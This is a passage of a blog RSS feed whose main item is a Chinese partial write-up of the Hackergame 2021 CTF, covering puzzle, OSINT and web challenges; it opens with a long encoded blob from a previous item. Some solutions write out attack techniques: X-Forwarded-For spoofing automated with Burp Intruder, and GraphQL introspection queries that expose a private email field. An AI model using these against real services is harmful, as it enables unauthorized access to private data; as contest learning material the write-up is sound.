;#x2F;cWo9f5nIbP+Vaw2bjZ5WKespE4CTAOxpk7DHXxh5wzYPld6NqjdYiaz1+DbLWVSIeRfX0h+bbsFal6+gDJ8hM5bHc5xrlim+nCloZXuBhEsd9ZEEIiGdew&amp;#x2F;l72jCnlfZH&amp;#x2F;tfxshLOAvJY86uGsytRp3UkGtDmnloRtJJ4lYB3aoIgcuQSt9NzyqU&amp;#x2F;sK8ivilobtO3s9+iDykFnLmtpI&amp;#x2F;c&amp;#x2F;wZMQ6na0GuyohYe397yya9UosBdt5jhumBxntnIPVeqKCdavin&amp;#x2F;P5AGbWo8LowD2pGyD0pHR9ptBYDuuIv4&amp;#x2F;tBuskdK3HQHPCOGIFj8Syqc9LG29IwtySpz&amp;#x2F;AkBEIg+81UJ5V+b5r7&amp;#x2F;jjlepp8ow049YyDcKzNP8HGAhfmYtEPb0zZKcd7ZyGYhID9RfUwHrPRSdSFuGDZhiBYhdrI2lpXaUgsbpho+CjUp74Dl6pl2RX+YNZSbl3P4wVfNBMlmOHWqJ8UEctbb&amp;#x2F;DVoSjs3C0kptMRBbBSwK8uUi9AR+Y17Ruti5Li7Hcc4iQ7FDJ7wnkAXD3KSGZ&amp;#x2F;OEvM1ghAazhRMeKANiZ&amp;#x2F;CGSidJwBq+PdF3RbqsshaWWjVi6oq9JktiCI78yJuZ+funSupw&amp;#x2F;M0YXKyiuXD6ZrxMcG5PjTWb&amp;#x2F;FH5XR2QtUTSwq&amp;#x2F;z1yYnhXTjtMjP6kex7yda58C&amp;#x2F;QD+0YBdKhyMxuwSzOixS5ryofQ5cavR&amp;#x2F;4zOBtxmDewhTSII+eLpgqFMdzZFnG7Bk4ot1AHPCOxA1bdEn3IzH9GQ7NMo3G4kskakXZC3K5QHcsgUr+&amp;#x2F;8k8fY79Utp&amp;#x2F;3sq&amp;#x2F;MqTgeml7NAau0jhkGbMANcr4jZj3N4tBsmo&amp;#x2F;InMiI7+H7k1fDa32BrzdoevMfJYA3PaDHFRFuoeDlWAnxAAyk11kKjnidwQ&amp;#x2F;rBqIzrdIBMAfyfbrA55Q47SBe7fwVrzFRBPKtjICzBPKzlIU5&amp;#x2F;xIfDo3IpEY8h6emLxN3dLLLuIBoCtm7MqkB9MA7hzlEwkGPY0oUwtH323Y43Y69s1ldtzi+J+tVbCJrz2y1VVo1sLtoRgxkTqjqCtJpOi2Q7JLLX1433EQ8tywYvxCjuBH4N8GVPsUCuZFVpUZ7kQEfpCCmRnyyIE8myFbHHKBqq369PP49Pv6OzpkbHJ2ZictG9Yoi85ahlyqbnSacOAIfRBnruBBqo4KwTbAgbesupr0cCPEEMfb0pdyhFFC91RfG0H0ASsdfZk66Jfd2TCjagq8&amp;#x2F;CKoCP2Vi+GLsV3du38v9uELTX3j3gxskoyDeb020ElGDk3L0rl2fIh8fa68knJSWs2z17N09NtGlNLzdbCu9AXBtq+bdxEOZXWk8u1o+YlFRFjphBNf9eMM3itN1&amp;#x2F;5wv2A3e++qsB3t3ZCyaz7ltIdzmy5us9lgNIo4h4ZYpHyUeuQbAqqb40v2w+0g1e&amp;#x2F;+9jtQJfZM+T+LEs16v8UQMB2Pr5Ug4lULpuYga76cbN&amp;#x2F;zebqqe5ABGYWEIBFM+bxLvNv6c3v0VREhA1QvSEqLeYR6OV15tOIzjpJf4dGP6URUYyIz1UlJkEQZSjUFCq2H76YOtieydin+5wXwB&amp;#x2F;s+jicn09aE6B3OYtp2CDBsDOdTtoOOzfz85Ee1dLhL9ogTrbaxkF0w8HRyACovRiag31U05liMpzg1CMVrDQo5qRUAdcNyJEXkSPbY88iZ75h&amp;#x2F;+9N8JhSeJQzxrhl5nhlR9jct9H0RP8fGdt1EGlHCMsxGRVmRBAxykf2bt5N6qnN6&amp;#x2F;Sjdfi0oPDxWdi3Y9M9ZWxgbqt5Tg&amp;#x2F;UW6v9EGe0+hA8Ii&amp;#x2F;Bq5Idw&amp;#x2F;gFR5jlnTwKdB58apXtbtaYnyU3T7dAWwtZ4OvIfv7&amp;#x2F;gpPbeyS1TqY71Gib1CW&amp;#x2F;lWfIO&amp;#x2F;0H98bOHPDIl8Ut3fi5xQG0yqHgQS165tTf2xo1i1sqD6tNDhCIDu&amp;#x2F;1uefrNO3ExZh3Ea9Ac3428&amp;#x2F;GWPVHlg4sqLKlZPds5NfKh0df+VPT3OLPLCH55NQXFtqwE&amp;#x2F;ZsCguOl42vTcKWrkXl71Gp+X5x+mdAu+H1KNhU3f6p&amp;#x2F;5sXiLyWT+T7h4SGvyOeBLUwJer4tFpByMATG560KhAuixXyzXwv8j70CyJp8s399T+N8eQhAxhXVBxgWdtl6Eu+rBPWbHmZXEH1&amp;#x2F;mghBG+RFwuCh4jNPDeQDOBewYrmimmbpmFt1Iqz&amp;#x2F;fuI5eSH8zQLMuzPKYhEG4p+5kPdBQkQz4NWzlrQ0yE2pXBvPNPngsljuC3pAVjRrUVb7MZtuO3BXPeDSb+EXgylh5rBmG7bkk43bdQ4TQyNs&amp;#x2F;FYt7cQ7tFzBQUhWoIDNWKiEs0hThjLY4Aw9zFxuF3Uf9H+fU7GlwZBrsU+QdPR0vKxB5EeyHUamO&amp;#x2F;NYRd5RtFNym4HhMqSEoTQPqLv79hzNyMyMvbrkOly&amp;#x2F;nIwAyXmBmaVTVwVZr1fT+zXgzQL+VY5ByLjJrDw4ghbk67RGlX0qTyXV4mXY41j+0YZioIDBDJHP7D8QHrhQpzOzhMyxkQ7WvTLWEaZqbvGSXN619WL1j9XZOecnOAZazEm0BawPD9vVCMar6VD01ZKHIQVY6+EmdhaWr9j4afovGGPIeFaLzg1YwA6czDMdWH0pbZmV539qrs+sX+toGO5fXI7buTnjvcbi85wKSPj1xlvSIVYD05WH9EX2S8IsJrdLqxVlG4IQj4TIzUpbKxuChuNjDQO0idakciMB9Mkg7ZEolOltVBvZWv47UhoMZHfECUqQARpkRfl8B3YW37L1ihQC1HVpGSI9EiqCLd6ZD0cjg6+E1JK3yDZ3pr0or57JCMX2U0Lf3G3zDiZ9E+kit5C4HsNPCA4Xq9qLcEnSTbUrwR&amp;#x2F;+Ol6DndvqxVSUjYEJCrmqp&amp;#x2F;Fi1CY2XgCle5ojZ9IAWjrbg01FGZMCi3iiSfILVNcl8q4ZZFLweZbi+TivrAC+zRX8cpdCBSMrdC5pCMsIPvzRLJNm+jY32VdintOlE4xMHTk9rr2uNKJ4hQKJREyoz7XCYJrlo9LYIcS2o9lKo3xjSkpnC0SFtg0Sy&amp;#x2F;pcpZw8wyOO2hTXOTmKzyOlw7VH1LtxTB14XoT95Y7euHiB&amp;#x2F;11oz+6uOb3uRm4iql1s+tXka5CfeFhSt9xk3k4S91VDa7f3akOPDdxCQ701qVjM5&amp;#x2F;aat2ARuoYfoghi1AwKpuWYchdLoYSrOiXX91SeH4gOR5UP8KXg2TnNOTvpHN5LRBKm58rMDe7ZmZCNM4AnubKNBP&amp;#x2F;X8UNMaIokp3+I6KpH0c3jmTnSHnLwoi5oqfNx&amp;#x2F;qT2K7ePGq3nqfTkCDqWKSWTe+QG6BsOXetF9mSKh8lPJbru3DfzZ6ICHsZIpfy8Vcfks5Hk+LT44&amp;#x2F;jwWR9xz0B&amp;#x2F;ia2bB6mG7X5Wo5AfbIFSVtrwYmm&amp;#x2F;bx5Mib9QOK1U2X9zav7ObfFmMpENUCxEi1tr+bVQt&amp;#x2F;iubPbpFZ6DNce8msWvzHhhV+81gn&amp;#x2F;QQ3YW+yq&amp;#x2F;Sm5CTP9pMfI72Mt6XCYtr1a6b&amp;#x2F;vWaKnBKOL7dS7w5ORYbH9GlxhtEv4s5wdh+uqDjIZJp4jTt8ysEikkyJg8vj60Ymgd4Q6GEytoArUF7MfNB&amp;#x2F;hYcgcCEOiOcVTRWL&amp;#x2F;sLMDeaSklA1i9tVBUP95ROYnHIR4qoKdqBsEAbGBfjnNMiSwqp&amp;#x2F;pdZIvF0LtjzRxgD5&amp;#x2F;BOvxZtq9zpu8WTP+InLqLtMkXXffeNwM7fKFvfb3RNQfXMPa8wNMLD80D3NyeVEJBZ3AZzhEKaruVZMfhbS&amp;#x2F;Nmcec9GF2nWQm2L8+qLxWbi0OM1lXBuCvMZ5DU8u5tr12a&amp;#x2F;vTwM0CP4gZ0ga9TSNVb2vfJdtHDuC9BSlTB7KcA&amp;#x2F;&amp;#x2F;xvozzLKhfZEUQvmOoyxtzthFSf&amp;#x2F;b3KhAUgu5GzrMSPPiEGNFIWbqm0UF9j5GStLEXm9fOuFvefZw5mH5q0zoIr4cbLFjRjE67EkG0riIEpGjoSG5c3GTsALEhfkv2VpxhSbtucDmKnftpHxYZQcJ+Atg9MnlcZ2mLE2wi8TqJ&amp;#x2F;Y8ODehHR6ocioUPGxZJblrquxAjAARnsqNZ1eIJIO2vOH83HUg0zGhfq4ag4DEEwIxczSRqNnMSuSta+O80zpla9CVaDwcLUG7KMyu0pTrwSLtuGgSa14iE+SQza7jIJs8PTwwRMb7N89oOaXs3QWsmlSybak0pgJ+pZLCiPQYHgD91kaTCRDOOz2sX1F4FSe4OP8ehuEH5vVhcg2&amp;#x2F;FRn0w5AfPRhz30XstZkZrJzYWLNLcB1uPC1bR5YD44AgaRPWQQmLdkmRj8ea5siGd3aDEPDAfNUUatAzwBsfZKZUis2P5LbAJpTjbxbQ9&amp;#x2F;Y8b9aqafukEV3Vs23IEyTx4uRWGUqbpP&amp;#x2F;e9vr6gFGcjM80TkKrsoiG6CuySRQUnUPGAmco8TZwI1ETwthdL5Xh2D82vI1Q93Lh1n194uCSLKPbVIFgxONJIKyIJFfAU&amp;#x2F;kP9Beqb+oLoBulIbDeechaTNfe8RrzZM&amp;#x3D;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/</guid>
            <title>Hackergame2021 部分WriteUp</title>
            <link>http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/</link>
            <category>Write-Up</category>
            <category>Hackergame</category>
            <pubDate>Sat, 30 Oct 2021 16:11:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;yyyのWriteUp&#34;&gt;&lt;a href=&#34;#yyyのWriteUp&#34; class=&#34;headerlink&#34; title=&#34;yyyのWriteUp&#34;&gt;&lt;/a&gt;yyyのWriteUp&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&#34;一点碎碎念&#34;&gt;&lt;a href=&#34;#一点碎碎念&#34; class=&#34;headerlink&#34; title=&#34;一点碎碎念&#34;&gt;&lt;/a&gt;一点碎碎念&lt;/h2&gt;&lt;p&gt;这是我的第一次Hackergame&amp;#x2F;CTF比赛，感觉很有意思。前几天心态有点崩，好在调整过来了。大家还是要把Hackergame当做game。最开心的是认识了好多大佬，抱大腿.jpg  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030161203937-1693462675.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;对自己的吐槽：EasyRSA差点做出来，扩展欧几里得写错弃疗了；RAID0卡在软件没有激活码不让保存；和各种小测撞；各种体调不良，饮食睡眠不佳；晚上学校断电没法做，我又是大夜猫子……奇奇怪怪挡路的东西一直不少，归根结底还是太菜了啦。&lt;br&gt;总之非常感谢@TonyCrane大佬、GodSpeed大佬及群内各成员的鼓励支持帮助（膜不算）。&lt;br&gt;希望我能早日学会binary和math。  &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;签到&#34;&gt;&lt;a href=&#34;#签到&#34; class=&#34;headerlink&#34; title=&#34;签到&#34;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;这题二分一下page参数即可。&lt;br&gt;&lt;del&gt;鼠标连点器&lt;/del&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;进制十六——参上&#34;&gt;&lt;a href=&#34;#进制十六——参上&#34; class=&#34;headerlink&#34; title=&#34;进制十六——参上&#34;&gt;&lt;/a&gt;进制十六——参上&lt;/h2&gt;&lt;p&gt;使用Hex Editor Neo直接新建文件抄写即可。当然OCR识别也行吧。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;去吧！追寻自由的电波&#34;&gt;&lt;a href=&#34;#去吧！追寻自由的电波&#34; class=&#34;headerlink&#34; title=&#34;去吧！追寻自由的电波&#34;&gt;&lt;/a&gt;去吧！追寻自由的电波&lt;/h2&gt;&lt;p&gt;下载音频后可以听出是一段人声，但是语速极快。于是使用Adobe Audition CC打开，效果-&amp;gt;伸缩与变调放慢速度，适当调节音高就能开始听写了。可以发现这是&lt;strong&gt;NATO Phonetic Alphabet&lt;/strong&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A ALPHA&lt;br&gt;B BRAVO&lt;br&gt;C CHARLIE&lt;br&gt;D DELTA&lt;br&gt;E ECHO&lt;br&gt;F FOXTROT&lt;br&gt;G GOLF&lt;br&gt;H HOTEL&lt;br&gt;I INDIA&lt;br&gt;J JULIET&lt;br&gt;K KILO&lt;br&gt;L LIMA&lt;br&gt;M MIKE&lt;br&gt;N NOVEMBER&lt;br&gt;O OSCAR&lt;br&gt;P PAPA&lt;br&gt;Q QUEBEC&lt;br&gt;R ROMEO&lt;br&gt;S SIERRA&lt;br&gt;T TANGO&lt;br&gt;U UNIFORM&lt;br&gt;V VICTOR&lt;br&gt;W WHISKEY&lt;br&gt;X X-RAY&lt;br&gt;Y YANKEE&lt;br&gt;Z ZULU  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 id=&#34;猫咪问答-Pro-Max&#34;&gt;&lt;a href=&#34;#猫咪问答-Pro-Max&#34; class=&#34;headerlink&#34; title=&#34;猫咪问答 Pro Max&#34;&gt;&lt;/a&gt;猫咪问答 Pro Max&lt;/h2&gt;&lt;p&gt;General× 杂技√  &lt;/p&gt;
&lt;h4 id=&#34;1-经典WebArchive-第一行就有答案-20150504&#34;&gt;&lt;a href=&#34;#1-经典WebArchive-第一行就有答案-20150504&#34; class=&#34;headerlink&#34; title=&#34;1. 经典WebArchive 第一行就有答案:20150504&#34;&gt;&lt;/a&gt;1. &lt;a href=&#34;http://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes&#34;&gt;经典WebArchive&lt;/a&gt; 第一行就有答案:20150504&lt;/h4&gt;&lt;h4 id=&#34;2-https-lug-ustc-edu-cn-wiki-intro&#34;&gt;&lt;a href=&#34;#2-https-lug-ustc-edu-cn-wiki-intro&#34; class=&#34;headerlink&#34; title=&#34;2. https://lug.ustc.edu.cn/wiki/intro/&#34;&gt;&lt;/a&gt;2. &lt;a href=&#34;https://lug.ustc.edu.cn/wiki/intro/&#34;&gt;https://lug.ustc.edu.cn/wiki/intro/&lt;/a&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;此处资料显示是4次，但并非最新，我后来手动尝试才得知是5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;3-FTP服务器-Obviously，答案是Development-Team-of-Library-后来得知网站首页news头图就有，我还找了好久&#34;&gt;&lt;a href=&#34;#3-FTP服务器-Obviously，答案是Development-Team-of-Library-后来得知网站首页news头图就有，我还找了好久&#34; class=&#34;headerlink&#34; title=&#34;3. FTP服务器 Obviously，答案是Development Team of Library 后来得知网站首页news头图就有，我还找了好久&#34;&gt;&lt;/a&gt;3. &lt;a href=&#34;https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2016.06.16_%E6%B4%BB%E5%8A%A8%E5%AE%A4%E6%90%AC%E8%BF%81/IMG_20160616_133655.jpg&#34;&gt;FTP服务器&lt;/a&gt; Obviously，答案是Development Team of Library &lt;del&gt;后来得知网站首页news头图就有，我还找了好久&lt;/del&gt;&lt;/h4&gt;&lt;h4 id=&#34;4-谷歌关键词SIGBOVIK2021-Newcomb-Benford直接就能找到原论文http-sigbovik-org-2021-proceedings-pdf-直接Ctrl-F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13&#34;&gt;&lt;a href=&#34;#4-谷歌关键词SIGBOVIK2021-Newcomb-Benford直接就能找到原论文http-sigbovik-org-2021-proceedings-pdf-直接Ctrl-F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13&#34; class=&#34;headerlink&#34; title=&#34;4. 谷歌关键词SIGBOVIK2021 Newcomb-Benford直接就能找到原论文http://sigbovik.org/2021/proceedings.pdf 直接Ctrl+F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13&#34;&gt;&lt;/a&gt;4. 谷歌关键词&lt;code&gt;SIGBOVIK2021&lt;/code&gt; &lt;code&gt;Newcomb-Benford&lt;/code&gt;直接就能找到原论文&lt;a href=&#34;http://sigbovik.org/2021/proceedings.pdf&#34;&gt;http://sigbovik.org/2021/proceedings.pdf&lt;/a&gt; 直接&lt;code&gt;Ctrl+F&lt;/code&gt;找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13&lt;/h4&gt;&lt;h4 id=&#34;5-谷歌关键词protocol-report-找到https-www-rfc-editor-org-rfc-rfc8962-html&#34;&gt;&lt;a href=&#34;#5-谷歌关键词protocol-report-找到https-www-rfc-editor-org-rfc-rfc8962-html&#34; class=&#34;headerlink&#34; title=&#34;5. 谷歌关键词protocol report 找到https://www.rfc-editor.org/rfc/rfc8962.html&#34;&gt;&lt;/a&gt;5. 谷歌关键词&lt;code&gt;protocol&lt;/code&gt; &lt;code&gt;report&lt;/code&gt; 找到&lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc8962.html&#34;&gt;https://www.rfc-editor.org/rfc/rfc8962.html&lt;/a&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt; 6.Reporting Offenses&lt;br&gt;Send all your reports of possible violations and all tips about wrongdoing to &lt;strong&gt;&amp;#x2F;dev&amp;#x2F;null&lt;/strong&gt;. The Protocol Police are listening and will take care of it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;del&gt;还挺幽默，一开始还真以为有police在listening&lt;/del&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;卖瓜&#34;&gt;&lt;a href=&#34;#卖瓜&#34; class=&#34;headerlink&#34; title=&#34;卖瓜&#34;&gt;&lt;/a&gt;卖瓜&lt;/h2&gt;&lt;p&gt;20不是3的倍数，乍看似乎不可能用6和9加和得到。但随便试了试，发现9斤的瓜很多很多时会溢出为-9223372036854775808，据此判断为int64溢出，判断应当在此处加以利用。&lt;br&gt;我们需要让这个数字稍微溢出一点，不能溢出太多。也就是略大于floor(9223372036854775808&amp;#x2F;9)，使得溢出为-9223372036854775808以外的数字，并且让该数字到20的距离能被3整除。之后直接加回20就行（简单小学(?)算数，屡有即将做出来时加过头超过20的惨剧hhh）&lt;br&gt;灵感来源：&lt;a href=&#34;https://www.bbsmax.com/A/pRdByjq65n/&#34;&gt;CTF 两道web整数溢出题目(猫咪银行和ltshop)&lt;/a&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;透明的文件&#34;&gt;&lt;a href=&#34;#透明的文件&#34; class=&#34;headerlink&#34; title=&#34;透明的文件&#34;&gt;&lt;/a&gt;透明的文件&lt;/h2&gt;&lt;p&gt;根据题面和文件会发现这是终端的颜色代码，网络搜索终端颜色代码格式后将所有&lt;code&gt;[&lt;/code&gt;前补上一个&lt;code&gt;\e&lt;/code&gt;，然后&lt;code&gt;echo -e &amp;quot;&amp;#123;内容&amp;#125;&amp;quot;&lt;/code&gt;就行啦。记得执行前把终端先用字符填满，不然可能画不完整。&lt;br&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154901529-149476643.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;旅行照片&#34;&gt;&lt;a href=&#34;#旅行照片&#34; class=&#34;headerlink&#34; title=&#34;旅行照片&#34;&gt;&lt;/a&gt;旅行照片&lt;/h2&gt;&lt;p&gt;&lt;del&gt;简简单单开个盒&lt;/del&gt;&lt;br&gt;旅游，海滩，汉字，说明这是国内一个海边旅游景点。&lt;br&gt;蓝色KFC？这可不常见，应该有不少人打卡了吧。&lt;br&gt;百度搜索&lt;code&gt;蓝色KFC&lt;/code&gt;，第一项就是某红书的&lt;code&gt;秦皇岛蒂凡尼蓝秦皇岛网红打卡|国内唯一蒂芙尼蓝色肯德基&lt;/code&gt;&lt;br&gt;百度地图定位发现这家店是某海底世界分店，直接得到电话号码。&lt;br&gt;&lt;a href=&#34;https://www.earthol.org/&#34;&gt;https://www.earthol.org/&lt;/a&gt;上通过街景发现三个汉字“海|豚|馆”&lt;br&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154657507-2019993326.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;对照地图，视线和海岸线大约成45°，推测应当在东南方向。进而发现影子西斜，应当在下午&amp;#x2F;傍晚&lt;br&gt;通过绘制各个水平线找出灭点可以推测楼层（知乎有些文章有详细说明）。我的方法是找到对面楼“最矩形”变形最少的窗户判断为同一楼层，然后数，发现是13层左右（经尝试发现是14层）&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;FLAG助力大红包&#34;&gt;&lt;a href=&#34;#FLAG助力大红包&#34; class=&#34;headerlink&#34; title=&#34;FLAG助力大红包&#34;&gt;&lt;/a&gt;FLAG助力大红包&lt;/h2&gt;&lt;p&gt;既然是和ip有关，第一时间想到的就是&lt;code&gt;X-Forwarded-For&lt;/code&gt;，果然成功了。因为每个&lt;code&gt;/8&lt;/code&gt;ip段（也就是例如255.0.0.0-255.255.255.255）都只能算一次，我们使用BurpSuite的Intruder，将Post数据中的ip和&lt;code&gt;X-Forwarded-For&lt;/code&gt;的ip首段打上标记，选择&lt;code&gt;Battering Ram&lt;/code&gt;模式（让两处参数一致），构造0~255的字典，自动化访问&lt;code&gt;0.114.114.114&lt;/code&gt;、&lt;code&gt;1.114.114.114&lt;/code&gt;、&lt;code&gt;2.114.114.114&lt;/code&gt;……&lt;code&gt;255.114.114.114&lt;/code&gt;达成刚好256个助力获得flag。由于每次间隔2s，2s*256&amp;#x3D;512s，小于题目时长限制10min&amp;#x3D;600s所以是可行的。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;Amnesia-轻度失忆&#34;&gt;&lt;a href=&#34;#Amnesia-轻度失忆&#34; class=&#34;headerlink&#34; title=&#34;Amnesia-轻度失忆&#34;&gt;&lt;/a&gt;Amnesia-轻度失忆&lt;/h2&gt;&lt;p&gt;直接&lt;code&gt;putchar()&lt;/code&gt;逐个打印绕过即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;图之上的信息&#34;&gt;&lt;a href=&#34;#图之上的信息&#34; class=&#34;headerlink&#34; title=&#34;图之上的信息&#34;&gt;&lt;/a&gt;图之上的信息&lt;/h2&gt;&lt;p&gt;GraphQL的利用。访问&lt;code&gt;/graphql?query=&amp;#123;&amp;#125;&lt;/code&gt;发现存在利用可能。查阅&lt;a href=&#34;https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ&#34;&gt;资料&lt;/a&gt;后得知可以利用内省注入。没有UI界面我直接地址栏输入。换行替换为&lt;code&gt;%0A&lt;/code&gt;后，访问&lt;code&gt;/graphql?query=&amp;#123;__schema%0A&amp;#123;types%0A&amp;#123;name&amp;#125;&amp;#125;&amp;#125;&lt;/code&gt;得到：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;data&amp;quot;:&amp;#123;&amp;quot;__schema&amp;quot;:&amp;#123;&amp;quot;types&amp;quot;:[&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;Query&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;GNote&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;Int&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;String&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;GUser&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;Boolean&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__Schema&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__Type&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__TypeKind&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__Field&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__InputValue&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__EnumValue&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__Directive&amp;quot;&amp;#125;,&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;__DirectiveLocation&amp;quot;&amp;#125;]&amp;#125;&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现有个&lt;code&gt;GUser&lt;/code&gt;类型。接下来访问&lt;code&gt;/graphql?query=&amp;#123;__type(name:&amp;quot;GUser&amp;quot;)&amp;#123;name%0Afields&amp;#123;name%0Atype&amp;#123;name,kind&amp;#125;&amp;#125;&amp;#125;&amp;#125;&lt;/code&gt;爆出字段名&lt;code&gt;privateEmail&lt;/code&gt;，然后直接&lt;code&gt;/graphql?query=&amp;#123;user(id:1)&amp;#123;id,privateEmail&amp;#125;&amp;#125;&lt;/code&gt;得到flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;赛博厨房&#34;&gt;&lt;a href=&#34;#赛博厨房&#34; class=&#34;headerlink&#34; title=&#34;赛博厨房&#34;&gt;&lt;/a&gt;赛博厨房&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Level0：直接写&lt;/li&gt;
&lt;li&gt;Level1：复制粘贴发现有长度限制 goto优化行数&lt;br&gt; 然后不会了。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;##阵列恢复大师-RAID5&lt;br&gt;直接丢进RAID Reconstructor 5里面跑得到镜像文件。Windows上并没法直接读，于是丢进Diskinternals Linux Reader里读文件导出。执行getflag.py却提示&lt;code&gt;Did you recover my data correctly?&lt;/code&gt;，疑惑之下换WSL(Kali Linux)执行就成功了。&lt;br&gt;&lt;del&gt;吐槽：RAID0的XFS需要注册码没法搞。WSL也mount不上，看来还是虚拟机靠谱。&lt;/del&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;助记词-第一顿大餐&#34;&gt;&lt;a href=&#34;#助记词-第一顿大餐&#34; class=&#34;headerlink&#34; title=&#34;助记词-第一顿大餐&#34;&gt;&lt;/a&gt;助记词-第一顿大餐&lt;/h2&gt;&lt;p&gt;代码审计后发现目的是延迟尽可能高。用BurpSuite改包在POST数据里复制出来很多行注记词提交就有了flag1。就像这样：  &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;necessary science growth addition&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;necessary science growth addition&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    （重复好多好多次）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;necessary science growth addition&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果不行CLEAR再试试。&lt;br&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030155443141-1922071122.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;小坑：token要跟上才能拿到flag，不过有时自动获取的token无效，使得flag只显示为true，因为加号没有URLEncode转义，不知道是不是bug.  &lt;/p&gt;
&lt;hr&gt;
